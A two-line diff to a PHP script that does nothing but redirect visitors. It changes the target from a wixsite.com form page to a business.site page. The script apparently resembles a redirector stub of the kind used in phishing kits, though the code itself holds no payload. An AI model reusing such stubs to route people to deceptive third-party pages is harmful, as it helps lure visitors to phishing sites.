@@ -1,4 +1,4 @@
 <?php
-header("Location: https://formcrtl1.wixsite.com/new1");
+header("Location: https://terrific-ice-cream.business.site/");
 die();
 ?>
